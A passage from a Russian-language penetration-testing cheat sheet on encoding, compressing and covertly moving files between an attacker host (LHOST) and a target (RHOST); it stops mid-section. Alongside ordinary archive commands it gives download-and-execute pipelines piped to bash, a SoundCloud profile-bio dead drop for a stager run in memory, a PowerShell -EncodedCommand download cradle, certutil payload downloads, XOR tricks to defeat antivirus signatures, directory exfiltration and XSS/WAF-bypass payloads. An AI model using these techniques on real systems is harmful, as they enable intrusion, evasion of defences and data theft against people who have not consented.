curl -s http://$LHOST/linenum.sh.xz.b64 | base64 -d | xz -d > linenum.sh
```

### Windows

**Encode / Decode - через `tar` (Windows 10 1803+) или `7z`:**
```cmd
tar -cJf file.bin.xz file.bin
tar -xJf file.bin.xz
7z a -txz file.bin.xz file.bin
7z x file.bin.xz
```

---

## zlib / DEFLATE (raw)

Голый поток без gzip-обёртки - иногда нужен для эксплойтов/протоколов. Только Python.

### Linux

**Encode:**
```bash
python3 -c "import zlib; open('file.zz','wb').write(zlib.compress(open('file.bin','rb').read(),9))"
```

**Decode:**
```bash
python3 -c "import zlib; open('file.bin','wb').write(zlib.decompress(open('file.zz','rb').read()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.zz | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > file.bin
```

### Windows

Через Python (те же команды, `python` вместо `python3`).

---

## tar (упаковка каталогов)

Флаги: `c` - create, `x` - extract, `f` - файл архива, `z` - gzip, `J` - xz, `-C DIR` - каталог распаковки.

### Linux

**Encode / Decode:**
```bash
# только упаковка
tar cf out.tar dir/
tar xf out.tar

# упаковка + gzip (частый вариант для эксфильтрации папки)
tar czf out.tar.gz dir/
tar xzf out.tar.gz

# + xz
tar cJf out.tar.xz dir/
tar xJf out.tar.xz
```

**Download from server + распаковать:**
```bash
curl -s http://$LHOST/out.tar.gz | tar xz
```

### Windows

Windows 10 1803+ содержит `bsdtar`:

```cmd
tar -czf out.tar.gz dir\
tar -xzf out.tar.gz
tar -cJf out.tar.xz dir\
tar -xJf out.tar.xz
```

---

## ZIP

Флаги: `-r` - рекурсивно; `-e` - запросить пароль; `-P PASS` - пароль в argv (виден в `ps`); `unzip -d DIR` - куда распаковать.

### Linux

```bash
zip -r out.zip dir/
unzip out.zip

# с паролем (слабое ZipCrypto)
zip -r -e out.zip dir/
```

**Download from server + распаковать:**
```bash
curl -s http://$LHOST/out.zip -o out.zip && unzip out.zip
```

### Windows

**Encode / Decode - PowerShell 5+:**
```powershell
Compress-Archive -Path C:\Users\Public\secrets\* -DestinationPath out.zip
Expand-Archive -Path out.zip -DestinationPath C:\Users\Public\extracted
```

**Download from server + распаковать - PowerShell:**
```powershell
iwr "http://${LHOST}/out.zip" -OutFile out.zip
Expand-Archive -Path out.zip -DestinationPath C:\Users\Public\extracted
```

---

## 7z

Флаги: `a` - добавить, `x` - распаковать; `-pPASS` - пароль; `-mhe=on` - шифровать заголовки/имена; `-mx=9` - максимум.

Лучшее сжатие + шифрование заголовков (`-mhe=on` прячет и имена файлов).

### Linux

```bash
apt install p7zip-full

# упаковать
7z a out.7z file.bin

# с паролем и шифрованием имён файлов
7z a -p'P@ss' -mhe=on out.7z dir/

# распаковать
7z x out.7z
```

**Download from server + распаковать:**
```bash
curl -s http://$LHOST/out.7z -o out.7z && 7z x out.7z
```

### Windows

```cmd
7z a out.7z file.bin
7z a -pP@ss -mhe=on out.7z dir\
7z x out.7z
```

---

## zstd (Zstandard)

Флаги: `-19` - максимум; `-d` - decompress; `-c` - stdout; `-T0` - все ядра; `-o` - выходной файл.

Современный баланс: жмёт лучше gzip, распаковывается быстрее xz. Поддержан в `tar`/`7z`.

### Linux

```bash
apt install zstd
zstd -19 file.bin -o file.bin.zst      # -19 = максимум
unzstd file.bin.zst                    # или: zstd -d file.bin.zst -o file.bin
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.zst | zstd -d > file.bin
```

**tar + zstd:**
```bash
tar --zstd -cf out.tar.zst dir/
tar --zstd -xf out.tar.zst
```

### Windows

```cmd
zstd -19 file.bin -o file.bin.zst
zstd -d file.bin.zst -o file.bin
tar --zstd -cf out.tar.zst dir\
tar --zstd -xf out.tar.zst
```

---

## lz4

Флаги: `-9` - максимум; `-d` - decompress; `-c` - stdout.

Очень быстрый, жмёт слабее. Для больших объёмов и быстрых каналов.

### Linux

```bash
apt install lz4
lz4 file.bin file.bin.lz4              # сжать
unlz4 file.bin.lz4                     # или: lz4 -d file.bin.lz4
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.lz4 | lz4 -d > file.bin
```

### Windows

Через `7z` (Modern7z) или Python:
```powershell
python -c "import lz4.frame;open('file.bin.lz4','wb').write(lz4.frame.compress(open('file.bin','rb').read()))"
python -c "import lz4.frame;open('file.bin','wb').write(lz4.frame.decompress(open('file.bin.lz4','rb').read()))"
```

---

## brotli

Флаги: `-q 11` - максимум качества; `-d` - decompress; `-o` - выходной файл; `-c` - stdout.

Хорошо жмёт текст/веб (формат `.br`). Есть CLI и Python.

### Linux

```bash
apt install brotli
brotli -q 11 -o file.bin.br file.bin
brotli -d -o file.bin file.bin.br
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.br | brotli -d > file.bin
```

### Windows

Через Python:
```powershell
python -c "import brotli;open('file.bin.br','wb').write(brotli.compress(open('file.bin','rb').read(),quality=11))"
python -c "import brotli;open('file.bin','wb').write(brotli.decompress(open('file.bin.br','rb').read()))"
```

---

## lzip / lrzip / lzop

Флаги: `-9` - максимум; `-d` - decompress; `-c` - stdout.

Родственники LZMA/LZO - для дистрибутивов и встраиваемых систем.

### Linux

```bash
# lzip (LZMA, .lz)
apt install lzip
lzip -9 file.bin                       # -> file.bin.lz
lzip -d file.bin.lz

# lrzip (.lrz)
apt install lrzip
lrzip file.bin                         # -> file.bin.lrz
lrzip -d file.bin.lrz

# lzop (.lzo)
apt install lzop
lzop file.bin                          # -> file.bin.lzo
lzop -d file.bin.lzo
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.lz  | lzip -d > file.bin
curl -s http://$LHOST/file.bin.lrz | lrzip -d > file.bin
curl -s http://$LHOST/file.bin.lzo | lzop -d > file.bin
```

### Windows

Нативно редки - `7z` (частично), WSL или Python-модули `lzma` / `lzo`.

---

## compress (.Z) / bzip3 / snappy

Флаги: `-k` - оставить исходник (bzip3); `-d` - decompress; `-c` - stdout (snzip/bzip3).

### Linux

```bash
# compress (.Z) - ncompress
apt install ncompress
compress file.bin                      # -> file.bin.Z
uncompress file.bin.Z

# bzip3 (.bz3) - современный BWT-компрессор
apt install bzip3
bzip3 -k file.bin                      # -> file.bin.bz3
bzip3 -d file.bin.bz3

# snappy - через snzip
apt install snzip
snzip file.bin                         # -> file.bin.sz
snzip -d file.bin.sz
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.Z   | uncompress > file.bin
curl -s http://$LHOST/file.bin.bz3 | bzip3 -d > file.bin
curl -s http://$LHOST/file.bin.sz  | snzip -d > file.bin
```

### Windows

`compress`/`bzip3`/`snappy` нативно редки - `7z`, WSL или Python (`bz3`, `python-snappy`).

---

## RAR

Флаги: `a` - добавить, `x` - распаковать; `-hpPASS` - пароль + шифрование заголовков; `-pPASS` - только данные; `-m5` - максимум сжатия.

Проприетарный, но всё ещё частый для больших архивов. Шифрование заголовков `-hp`.

### Linux

```bash
apt install rar unrar
rar a out.rar file.bin
rar a -hp'P@ss' out.rar dir/           # -hp = шифровать и данные, и заголовки
unrar x out.rar
```

**Download from server + распаковать:**
```bash
curl -s http://$LHOST/out.rar -o out.rar && unrar x out.rar
```

### Windows

```cmd
rar a out.rar file.bin
rar a -hpP@ss out.rar dir\
unrar x out.rar
```

---

## CAB / cpio / ar (редкие архивы)

Флаги: `cabextract FILE` - распаковать; `cpio -o -H newc` - создать архив; `cpio -idmv` - extract; `ar rcs` - создать/добавить; `ar x` - распаковать.

### Linux

```bash
# CAB (Microsoft Cabinet) - распаковка
apt install cabextract
cabextract file.cab

# cpio (initramfs, RPM)
find dir/ | cpio -o -H newc > out.cpio
cpio -idmv < out.cpio

# ar (deb, статические библиотеки)
ar rcs out.a file.o
ar x out.a
```

### Windows

```cmd
:: CAB распаковывается встроенным expand.exe
expand file.cab -F:* C:\Users\Public\extracted
```

---

# Часть 3. Веб / MIME / текстовые экранирования

Не «бинарь -> текст», а преобразование **строк** - для payload'ов, обхода фильтров, веб- и почтовых форматов.

## URL-encoding (percent-encoding)

Флаги: `quote(..., safe='')` - кодировать всё, включая `/`; `unquote` - декодировать; `jq -sRr @uri` - то же через jq.

`%XX` - кодирование для URL/HTTP. Нужно для SSRF, открытых редиректов, обхода WAF.

### Linux

```bash
# encode (всё, кроме букв/цифр)
python3 -c "import urllib.parse,sys; sys.stdout.write(urllib.parse.quote(sys.stdin.read(), safe=''))" < in.txt > out.txt
# decode
python3 -c "import urllib.parse,sys; sys.stdout.write(urllib.parse.unquote(sys.stdin.read()))" < out.txt > in.txt

# encode через jq (если установлен)
jq -sRr @uri < in.txt > out.txt
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.uri | python3 -c "import sys,urllib.parse; sys.stdout.write(urllib.parse.unquote(sys.stdin.read()))" > file.txt
```

### Windows

```powershell
[uri]::EscapeDataString("a b/c?d=e")               # encode
[uri]::UnescapeDataString("a%20b%2Fc%3Fd%3De")     # decode
```

---

## HTML entities

Флаги: `html.escape` - encode; `html.unescape` - decode; PowerShell - `HtmlEncode`/`HtmlDecode`.

`&lt; &gt; &amp; &#x41;` - для XSS/инъекций и парсинга HTML.

### Linux

```bash
python3 -c "import html,sys; sys.stdout.write(html.escape(sys.stdin.read()))" < in.txt > out.txt
python3 -c "import html,sys; sys.stdout.write(html.unescape(sys.stdin.read()))" < out.txt > in.txt
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.html | python3 -c "import sys,html; sys.stdout.write(html.unescape(sys.stdin.read()))" > file.txt
```

### Windows

```powershell
[System.Net.WebUtility]::HtmlEncode("<script>")
[System.Net.WebUtility]::HtmlDecode("&lt;script&gt;")
```

---

## Quoted-printable

Флаги: `quopri.encode(..., 1)` - третий аргумент кодирует табы/пробелы; `quopri.decode` - обратно; Perl `-MMIME::QuotedPrint -0777` читает файл целиком.

`=XX`-экранирование из MIME/e-mail (RFC 2045). Полезно при разборе писем.

### Linux

```bash
# encode
python3 -c "import quopri,sys; quopri.encode(sys.stdin.buffer, sys.stdout.buffer, 1)" < file.bin > file.qp
# decode
python3 -c "import quopri,sys; quopri.decode(sys.stdin.buffer, sys.stdout.buffer)" < file.qp > file.bin

# альтернатива на Perl
perl -MMIME::QuotedPrint -0777 -ne 'print decode_qp($_)' < file.qp > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.qp | python3 -c "import quopri,sys; quopri.decode(sys.stdin.buffer, sys.stdout.buffer)" > file.bin
```

### Windows

Через Python (те же команды, `python` вместо `python3`).

---

## Punycode / IDN

Флаги: `idn2` - Unicode -> Punycode; `-d` - Punycode -> Unicode.

`xn--...` - кодирование Unicode-доменов. Нужно для фишинга, обхода проверок хостов, SSRF.

### Linux

```bash
apt install idn2
idn2 пример.рф              # -> xn--e1afmkfd.xn--p1ai
idn2 -d xn--e1afmkfd.xn--p1ai
```

**Python:**
```bash
python3 -c "print('пример'.encode('idna').decode())"          # -> xn--e1afmkfd
python3 -c "print('xn--e1afmkfd'.encode().decode('idna'))"
```

### Windows

```powershell
$idn = New-Object System.Globalization.IdnMapping
$idn.GetAscii("пример.рф")
$idn.GetUnicode("xn--e1afmkfd.xn--p1ai")
```

---

## Unicode-экранирование (`\uXXXX`, `\xNN`, UTF-7)

Флаги: `unicode_escape` - `\uXXXX`/`\xNN`; `utf-7` - UTF-7; `sed 's/\\x//g' | xxd -r -p` - hex -> binary.

Для payload'ов и обхода фильтров: `\u003c` = `<`, `\x3c` = `<`. UTF-7 исторически ломал XSS-фильтры.

### Linux

```bash
# \uXXXX (и \xNN) - decode
python3 -c "import sys; sys.stdout.write(sys.stdin.read().encode().decode('unicode_escape'))" < in.txt > out.txt
# \uXXXX - encode
python3 -c "print(open('in.txt').read().encode('unicode_escape').decode())" > out.txt

# \xNN - decode через sed + xxd
sed 's/\\x//g; s/ //g' in.txt | xxd -r -p > out.bin

# UTF-7
python3 -c "print('<script>alert(1)</script>'.encode('utf-7').decode())"
python3 -c "print('+ADw-script+AD4-alert(1)+ADw-/script+AD4-'.encode().decode('utf-7'))"
```

### Windows

```powershell
# \uXXXX -> символы
'\u003cscript\u003e' -replace '\\u([0-9a-fA-F]{4})', { [char][Convert]::ToInt32($_.Groups[1].Value,16) }
# UTF-7
[Text.Encoding]::UTF7.GetString([Text.Encoding]::UTF7.GetBytes("<script>"))
```

---

## PGP / MIME ASCII armor

Флаги: `gpg --enarmor` - бинарь -> ASCII armor; `--dearmor` - обратно; `openssl base64 -in/-out` - только кодирование, не шифрование.

Оборачивает бинарь в `-----BEGIN PGP MESSAGE-----` - выглядит «легально» и проходит текстовые каналы.

### Linux

```bash
# PGP armor
gpg --enarmor < file.bin > file.asc
gpg --dearmor < file.asc > file.bin

# MIME/base64 с заголовками (uuencode -m)
uuencode -m file.bin file.bin > file.mime

# PEM через openssl (base64 + заголовок)
openssl base64 -in file.bin -out file.pem
```

**Download from server + dearmor:**
```bash
curl -s http://$LHOST/file.asc | gpg --dearmor > file.bin
```

### Windows

```cmd
gpg --enarmor < file.bin > file.asc
gpg --dearmor < file.asc > file.bin
:: base64-PEM через certutil
certutil -decode file.pem file.bin
```

---

# Часть 4. Классика и скрытые каналы

## Atbash / Caesar (классические подстановки)

### Linux

```bash
# Atbash (A<->Z, a<->z)
echo "Attack at dawn" | tr 'A-Za-z' 'Z-Az-a'

# Caesar +3 (encode)
echo "Attack at dawn" | tr 'A-Za-z' 'D-ZA-Cd-za-c'
# Caesar +3 (decode)
echo "Dwwdfn dw gdzq" | tr 'D-ZA-Cd-za-c' 'A-Za-z'
```

### Windows

```powershell
$map = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba"
$out = -join ((Get-Content -Raw in.txt).ToCharArray() | ForEach-Object {
  if     ($_ -cmatch '[A-Z]') { $map[[int][char]$_ - 65] }
  elseif ($_ -cmatch '[a-z]') { $map[[int][char]$_ - 97 + 26] }
  else                        { $_ }
})
[IO.File]::WriteAllText("out.txt", $out)
```

---

## Morse / A1Z26 / Binary / Decimal

Числовые и «человеческие» представления - для CTF и каналов, где нельзя передать обычные символы.

### Linux

```bash
# A1Z26 (A=1..Z=26)
python3 -c "print(' '.join(str(ord(c.upper())-64) for c in 'HELLO'))"
python3 -c "print(''.join(chr(int(x)+64) for x in '8 5 12 12 15'.split()))"

# Binary (0/1)
python3 -c "print(' '.join(format(b,'08b') for b in open('file.bin','rb').read()))" > file.bin
python3 -c "import sys; sys.stdout.buffer.write(bytes(int(x,2) for x in sys.stdin.read().split()))" < file.bin > out.bin

# Decimal (байты как числа)
python3 -c "print(' '.join(str(b) for b in open('file.bin','rb').read()))" > file.dec
python3 -c "import sys; sys.stdout.buffer.write(bytes(int(x) for x in sys.stdin.read().split()))" < file.dec > file.bin

# Morse
pip install morse-talk
python3 -c "import morse_talk as mtalk; print(mtalk.encode('SOS'))"
python3 -c "import morse_talk as mtalk; print(mtalk.decode('... --- ...'))"
```

### Windows

Через Python (те же команды, `python` вместо `python3`).

---

## Zero-width / Unicode-стеганография

Прячет данные **невидимыми** символами (U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF) внутри обычного текста - идеальный канал для bio/комментариев/чатов.

### Linux

**Encode (спрятать `file.bin` в `cover.txt` -> `stego.txt`):**
```bash
python3 - <<'PY'
data = open('file.bin','rb').read()
bits = ''.join(f'{b:08b}' for b in data)
zw = {'0':'\u200b', '1':'\u200c'}          # ZWSP / ZWNJ
cover = open('cover.txt', encoding='utf-8').read()
open('stego.txt','w', encoding='utf-8').write(cover + ''.join(zw[b] for b in bits))
PY
```

**Decode:**
```bash
python3 - <<'PY'
t = open('stego.txt', encoding='utf-8').read()
bits = ''.join('0' if c == '\u200b' else '1' for c in t if c in '\u200b\u200c')
open('file.bin','wb').write(bytes(int(bits[i:i+8],2) for i in range(0, len(bits)-7, 8)))
PY
```

**Найти/срезать невидимые символы:**
```bash
grep -oP '[\x{200b}\x{200c}\x{200d}\x{feff}]' stego.txt | wc -l
sed 's/[\x{200b}\x{200c}\x{200d}\x{feff}]//g' stego.txt > clean.txt
```

### Windows

Через Python (те же скрипты, `python` вместо `python3`). Готовые библиотеки: `pip install zwsp-steg-py`.

---

## QR-код как канал

Флаги: `qrencode -o FILE` - выходная картинка; `zbarimg -q` - без служебного вывода; `--raw` - только данные QR.

Бинарь -> base64 -> QR; удобно для передачи через экран/камеру или «печать на бумаге».

### Linux

```bash
apt install qrencode zbar-tools
# файл -> base64 -> QR-картинка
base64 -w0 file.bin | qrencode -o qr.png
# QR -> данные
zbarimg -q --raw qr.png | base64 -d > file.bin
```

> Большой файл в один QR не влезет - режем base64 на части и генерируем серию (`split -b 2000`) либо используем multi-QR (`paperkey`, `qrencode -S`).

### Windows

```powershell
pip install qrcode pillow pyzbar
python -c "import base64,qrcode;qrcode.make(base64.b64encode(open('file.bin','rb').read())).save('qr.png')"
python -c "from pyzbar.pyzbar import decode;from PIL import Image;import base64;open('file.bin','wb').write(base64.b64decode(decode(Image.open('qr.png'))[0].data))"
```

---

## Полный набор: `linenum.sh` во всех кодировках

Сводный рецепт: на LHOST генерируем файл в каждой кодировке, на RHOST забираем его по HTTP и декодируем на лету.

```bash
# ============================================================
# LHOST - генерация всех кодировок из linenum.sh
# ============================================================

# если хотим выполнить в памяти (убираем имя файла и >)
curl -s http://$LHOST/linenum.hex | xxd -r -p | sh

# base64
base64 -w0 linenum.sh > linenum.b64
#RHOST
curl -s http://$LHOST/linenum.b64 | base64 -d > linenum.sh

# base32
base32 -w0 linenum.sh > linenum.b32
#RHOST
curl -s http://$LHOST/linenum.b32 | base32 -d > linenum.sh

# hex
xxd -p linenum.sh | tr -d '\n' > linenum.hex
#RHOST
curl -s http://$LHOST/linenum.hex | xxd -r -p > linenum.sh

# gzip
gzip -9 -c linenum.sh > linenum.gz
#RHOST
curl -s http://$LHOST/linenum.gz | gunzip > linenum.sh

# bzip2
bzip2 -9 -c linenum.sh > linenum.bz2
#RHOST
curl -s http://$LHOST/linenum.bz2 | bunzip2 > linenum.sh

# xz
xz -9 -c linenum.sh > linenum.xz
#RHOST
curl -s http://$LHOST/linenum.xz | xz -dc > linenum.sh

# zlib
python3 -c "import zlib;open('linenum.zlib','wb').write(zlib.compress(open('linenum.sh','rb').read(),9))"
#RHOST
curl -s http://$LHOST/linenum.zlib | python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > linenum.sh

# AES-256-CBC (пароль transfer)
openssl enc -aes-256-cbc -pbkdf2 -base64 -k transfer -in linenum.sh > linenum.enc
#RHOST
curl -s http://$LHOST/linenum.enc | openssl enc -d -aes-256-cbc -pbkdf2 -base64 -k transfer > linenum.sh

# base85 (Ascii85)
python3 -c "import base64;open('linenum.b85','wb').write(base64.b85encode(open('linenum.sh','rb').read()))"
#RHOST
curl -s http://$LHOST/linenum.b85 | python3 -c "import sys,base64;sys.stdout.buffer.write(base64.b85decode(sys.stdin.buffer.read()))" > linenum.sh

# z85
basenc --z85 < linenum.sh > linenum.z85
#RHOST
curl -s http://$LHOST/linenum.z85 | basenc --z85 -d > linenum.sh

# UTF-16LE
iconv -f UTF-8 -t UTF-16LE linenum.sh > linenum.utf16
#RHOST
curl -s http://$LHOST/linenum.utf16 | iconv -f UTF-16LE -t UTF-8 > linenum.sh

# uuencode
uuencode linenum.sh linenum.sh > linenum.uu
#RHOST
curl -s http://$LHOST/linenum.uu > /tmp/l.uu && uudecode -o linenum.sh /tmp/l.uu

# XOR 0x42 -> base64
python3 -c "import base64;open('linenum.xor42.b64','wb').write(base64.b64encode(bytes(b^0x42 for b in open('linenum.sh','rb').read())))"
#RHOST
curl -s http://$LHOST/linenum.xor42.b64 | python3 -c "import sys,base64;sys.stdout.buffer.write(bytes(b^0x42 for b in base64.b64decode(sys.stdin.buffer.read())))" > linenum.sh

# XOR 0x5A (сырой)
python3 -c "open('linenum.xor5a','wb').write(bytes(b^0x5A for b in open('linenum.sh','rb').read()))"
#RHOST
curl -s http://$LHOST/linenum.xor5a | python3 -c "import sys;sys.stdout.buffer.write(bytes(b^0x5A for b in sys.stdin.buffer.read()))" > linenum.sh

# три слоя: base64url -> base16 -> base32
basenc --base64url < linenum.sh | basenc --base16 | basenc --base32 > linenum.x3
#RHOST
curl -s http://$LHOST/linenum.x3 | basenc --base32 -d | basenc --base16 -d | basenc --base64url -d > linenum.sh

# октали (\NNN)
od -An -to1 -v linenum.sh | tr -s ' ' '\' | sed 's/\\$//' > linenum.oct
#RHOST
curl -s http://$LHOST/linenum.oct > /tmp/l.oct && printf "$(cat /tmp/l.oct)" > linenum.sh

# sha256 (проверка целостности)
sha256sum linenum.sh > linenum.sh.sha256
#RHOST
curl -s http://$LHOST/linenum.sh.sha256 -o linenum.sh.sha256 && sha256sum -c linenum.sh.sha256

# tar.gz (nc | tar)
tar czf linenum.tar.gz linenum.sh
#RHOST
curl -s http://$LHOST/linenum.tar.gz | tar xz
```

---

## SOUNDCLOUD - доставка payload через публичное поле BIO

> **Только авторизованные лаборатории.** Приём злоупотребляет сторонним сервисом и нарушает его Terms of Service. Используйте **свой** аккаунт; никогда не публикуйте payload в чужом профиле. Маркер ниже идентифицирует ваш payload - это не средство защиты и не делает канал легитимным.

Флаги: `curl -s` - silent; `-H` - заголовок; `--compressed` - curl сам согласует и распакует gzip/deflate/br; `grep -oE` - только совпадения; `sed` - срезать JSON-обёртку и маркер.

Идея: используем публичное текстовое поле `bio` в SoundCloud как dead drop для **небольшого stager**. Bio ограничено ~4 000 символов - это примерно 3 КБ base64 и около 2-3 КБ сжатых xz данных. Этого хватит на короткий shell/PowerShell-stager, но `linenum.sh` **не поместится**. Для полноценного набора инструментов кладите в bio только ссылку на загрузку (или используйте другой канал).

В HTML профиля много полей `"description"` (треки, плейлисты и т.д.). Именно уникальный маркер в начале bio делает извлечение детерминированным: `grep` должен искать маркер, а не любое описание.

1. Сжимаем stager через `xz`.
2. Добавляем уникальный маркер (буквы/цифры, например `AEZAKMI`) и кодируем сжатые байты в base64. Base64 добавляет ~33%, но для stager результат всё равно небольшой.
3. Вставляем маркер + base64 в bio своего профиля.
4. На RHOST забираем профиль, выбираем описание, начинающееся с маркера, срезаем обёртку и маркер, затем декодируем.

**Собрать строку для bio (LHOST):**
```bash
MARKER='AEZAKMI'
{ printf '%s' "$MARKER"; xz -9 < stager.sh | base64 -w0; } > bio.txt
cat bio.txt        # вставьте это в bio своего профиля SoundCloud
```

**Только извлечение (без выполнения) - обратите внимание на маркер в `grep`:**
```bash
MARKER='AEZAKMI'
curl -s "https://soundcloud.com/YOUR_PROFILE" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  --compressed \
  | grep -oE '"description":"'"$MARKER"'[^"]*"' \
  | head -1 \
  | sed 's/^"description":"//; s/"$//' \
  | sed "s/^$MARKER//" > payload.b64
base64 -d payload.b64 | xz -d > stager.sh
```

**Полный конвейер - забрать, распаковать и выполнить без записи на диск:**
```bash
MARKER='AEZAKMI'
curl -s "https://soundcloud.com/YOUR_PROFILE" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  --compressed \
  | grep -oE '"description":"'"$MARKER"'[^"]*"' \
  | head -1 \
  | sed 's/^"description":"//; s/"$//' \
  | sed "s/^$MARKER//" \
  | tr -d '\n\r ' \
  | base64 -d \
  | xz -d \
  | bash
```

> `grep` выбирает поле **по маркеру**; `sed` лишь удаляет JSON-обёртку и сам маркер. Без маркера в `grep` команда `head -1` возьмёт произвольное поле `description`, и конвейер либо упадёт, либо выполнит мусор. Делайте маркер уникальным для каждого payload и используйте только буквы/цифры, чтобы он был безопасен и в `grep`, и в `sed`.
>
> `--compressed` позволяет curl рекламировать только те кодировки, с которыми он собран. Не задавайте `Accept-Encoding: br` вручную, если ваш curl не поддерживает Brotli, иначе получите ошибку "unrecognized content encoding".
>
> Для IDS/IPS это всё ещё обычный HTTPS-трафик к `soundcloud.com`. В этом и смысл dead drop на доверенном сайте - и в этом же его хрупкость: HTML профиля и лимит bio могут измениться в любой момент.

---

## Интересные комбинации

Готовые «матрёшки» из сжатия, кодирования и обфускации. Логика одна: **сжать -> закодировать -> передать -> раскодировать -> распаковать**. Сжатие уменьшает объём и попутно ломает сигнатуры, кодирование делает данные текстом, XOR/шифрование прячет содержимое.

> **Правило порядка:** на приёме слои снимаются **в обратном порядке**. Шифровали последним - расшифровываете первым; кодировали последним - декодируете первым.

### xz + base64 (максимум сжатия в текст)

Лучший размер для крупных файлов, спокойно проходит текстовые каналы.

```bash
# LHOST - упаковать
xz -9 < file.bin | base64 -w0 > file.txt

# RHOST - распаковать файлом
base64 -d file.txt | xz -d > file.bin

# RHOST - выполнить без записи на диск
curl -s http://$LHOST/file.txt | base64 -d | xz -d | bash
```

### gzip + base64 (универсальный минимум)

`gzip` есть везде, включая Windows/PowerShell-сценарии.

```bash
# LHOST
gzip -9 -c file.bin | base64 -w0 > file.txt
# RHOST
base64 -d file.txt | gunzip > file.bin
```

### zstd + base64 (быстро и компактно)

Компромисс между `gzip` и `xz` по скорости/размеру.

```bash
# LHOST
zstd -19 -c file.bin | base64 -w0 > file.txt
# RHOST
base64 -d file.txt | zstd -d > file.bin
```

### tar + xz + base64 (папка целиком в одну строку)

Эксфильтрация каталога одним текстовым блобом.

```bash
# LHOST - упаковать каталог
tar cJf - dir/ | base64 -w0 > loot.txt
# RHOST - развернуть
base64 -d loot.txt | tar xJf -
```

### XOR + base64 (снять сигнатуру/эвристику)

XOR убирает узнаваемые строки (`MZ`, сигнатуры AV), base64 снова делает текст.

```bash
# LHOST - XOR 0x42 + base64
python3 -c "import base64;open('x.b64','wb').write(base64.b64encode(bytes(b^0x42 for b in open('file.bin','rb').read())))"
# RHOST - base64 -d + XOR
python3 -c "import base64;open('file.bin','wb').write(bytes(b^0x42 for b in base64.b64decode(open('x.b64','rb').read())))"
```

### gzip + XOR + base64 (сжатие + обфускация)

Сначала жмём, потом обфусцируем, потом кодируем.

```bash
# LHOST
python3 -c "import gzip,base64;open('x.b64','wb').write(base64.b64encode(bytes(b^0x5A for b in gzip.compress(open('file.bin','rb').read(),9))))"
# RHOST
python3 -c "import gzip,base64;open('file.bin','wb').write(gzip.decompress(bytes(b^0x5A for b in base64.b64decode(open('x.b64','rb').read()))))"
```

### AES + base64 (шифрование в текстовом канале)

Содержимое не читается, даже если канал вскрыли. Подробнее - [11 - Encryption](11-encryption.md).

```bash
# LHOST - зашифровать и закодировать
openssl enc -aes-256-cbc -pbkdf2 -base64 -k 'transfer' -in file.bin -out file.enc
# RHOST - раскодировать и расшифровать
openssl enc -d -aes-256-cbc -pbkdf2 -base64 -k 'transfer' -in file.enc -out file.bin
```

Флаги: `-aes-256-cbc` - шифр; `-pbkdf2` - KDF; `-base64` - ASCII armor; `-k` - пароль в argv (лучше `-pass env:PASS`); `-d` - decrypt; `-in`/`-out` - файлы.

### Двойной base64 (обход фильтров, декодирующих один слой)

Простые WAF/сканеры снимают один слой base64 - второй остаётся.

```bash
# LHOST
base64 -w0 file.bin | base64 -w0 > file.b64x2
# RHOST
base64 -d file.b64x2 | base64 -d > file.bin
```

### base64url + JSON (бинарь в JSON-поле)

Протащить файл внутри обычного JSON-запроса/поля.

```bash
# LHOST - значение для JSON
python3 -c "import base64,json;print(json.dumps({'d':base64.urlsafe_b64encode(open('file.bin','rb').read()).decode()}))" > payload.json
# RHOST - вытащить и раскодировать
python3 -c "import json,base64;open('file.bin','wb').write(base64.urlsafe_b64decode(json.load(open('payload.json'))['d']))"
```

### PowerShell -EncodedCommand (UTF-16LE + base64, без файла)

Выполнение на Windows без падения файла на диск; аргумент выглядит как обычный base64.

```bash
# LHOST - собрать -EncodedCommand
CMD='IEX(New-Object Net.WebClient).DownloadString("http://LHOST/s.ps1")'
echo -n "$CMD" | iconv -t UTF-16LE | base64 -w0
# RHOST (Windows)
powershell -NoProfile -EncodedCommand <СТРОКА>
```

### certutil round-trip (LOLBin на Windows)

Встроенный инструмент: для декодирования ничего доставлять не нужно.

```cmd
:: RHOST (Windows) - скачать и декодировать без сторонних утилит
certutil -urlcache -f http://LHOST/file.b64 file.b64
certutil -decode file.b64 payload.exe
```

### URL-encode + HTML entities (обход XSS/WAF-фильтров)

Разные парсеры раскрывают разные слои - то, что пропустил один, «доедет» до другого.

```bash
# LHOST - payload -> HTML entities -> URL-encode
echo -n '<img src=x onerror=alert(1)>' | python3 -c "import html,urllib.parse,sys;sys.stdout.write(urllib.parse.quote(html.escape(sys.stdin.read()),safe=''))"
```

### Двойное URL-кодирование (обход WAF с одним декодом)

WAF раскодирует один раз, приложение - ещё раз.

```bash
# LHOST
python3 -c "import urllib.parse as u;print(u.quote(u.quote('/etc/passwd')))"
# -> %252Fetc%252Fpasswd
```

### UTF-7 / Unicode-эскейпы (обход фильтров в вебе)

Для XSS-контекстов, которые не ждут не-ASCII, и для JSON/JS.

```bash
# UTF-7
python3 -c "print('<script>alert(1)</script>'.encode('utf-7').decode())"
# \uXXXX
python3 -c "print('<script>'.encode('unicode_escape').decode())"
```

### base32 (регистронезависимый/голосовой канал)

Только `A-Z2-7` - переживает смену регистра, ручной ввод и диктовку.

```bash
# LHOST
base32 -w0 file.bin > file.b32
# RHOST
base32 -d file.b32 > file.bin
```

### Base2048 + соцсеть (бинарь через твит/чат)

Уместить payload в лимит символов поста.

```bash
